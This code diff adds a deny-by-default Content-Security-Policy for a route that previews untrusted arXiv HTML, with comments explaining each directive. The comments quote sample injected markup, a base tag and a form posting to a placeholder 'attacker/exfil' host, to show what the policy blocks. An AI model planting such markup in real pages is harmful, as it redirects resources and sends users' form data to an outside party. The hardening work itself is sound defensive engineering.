@@ -176,6 +176,55 @@ CONTENT_SECURITY_POLICY_UI: bytes = (
     b"frame-ancestors 'none'"
 )
 
+#: Tighter CSP for the m10 per-paper preview route
+#: (``/ui/notebooks/{slug}/papers/{paper_id}/preview``). The route
+#: serves UNTRUSTED HTML (stored ar5iv output from arXiv papers) so
+#: the policy is "deny by default" — every directive that does NOT
+#: fall back to ``default-src`` is named explicitly.
+#:
+#: Per CSP3 §6.8.3 ("Get fetch directive fallback list"), only
+#: FETCH directives inherit from ``default-src``. Three non-fetch
+#: directives need explicit values:
+#:
+#: - ``base-uri 'none'`` (DOCUMENT directive) — without it, a
+#:   ``<base href="https://attacker/">`` in the paper redirects ALL
+#:   relative URL resolution to the attacker's origin.
+#: - ``form-action 'none'`` (NAVIGATION directive) — without it,
+#:   ``<form action="https://attacker/exfil">`` POSTs to the
+#:   attacker on user submit.
+#: - ``frame-ancestors 'none'`` (NAVIGATION directive) — without
+#:   it, any origin can iframe the preview page (clickjacking).
+#:   CSP3 §8.4: ``frame-ancestors`` supersedes ``X-Frame-Options``
+#:   when both are present, so this directive is load-bearing here
+#:   even though the global ``SecurityHeadersMiddleware`` already
+#:   emits ``X-Frame-Options: DENY``.
+#:
+#: ``script-src 'none'`` plus the fallback chain
+#: ``script-src-attr`` → ``script-src`` → ``default-src`` also
+#: blocks inline event handlers (``onclick="..."``,
+#: ``onerror="..."``) per CSP3 §6.1.12.
+#:
+#: ``img-src 'self' data:`` keeps ar5iv's self-hosted assets +
+#: small inline data-URIs working. ``style-src 'self'
+#: 'unsafe-inline'`` keeps ar5iv's inline styling working; the
+#: ``@import`` URL form of CSS still routes through ``style-src``
+#: so external CSS is blocked by ``'self'``.
+#:
+#: Trade-off documented in the m10 research synthesis: ar5iv math
+#: rendering uses MathJax 3 which requires ``script-src 'self'
+#: 'unsafe-eval'``. With ``script-src 'none'``, math displays as
+#: raw LaTeX markup rather than typeset. Acceptable for v2 m10;
+#: server-side KaTeX pre-render is a future-enhancement candidate.
+CONTENT_SECURITY_POLICY_PREVIEW: bytes = (
+    b"default-src 'none'; "
+    b"img-src 'self' data:; "
+    b"style-src 'self' 'unsafe-inline'; "
+    b"script-src 'none'; "
+    b"base-uri 'none'; "
+    b"form-action 'none'; "
+    b"frame-ancestors 'none'"
+)
+
 #: Path prefixes that receive the UI CSP header. Other paths
 #: (``/mcp``, ``/metrics``, ``/healthz``) get no CSP — those are
 #: JSON / Prometheus / text-only and don't load scripts.
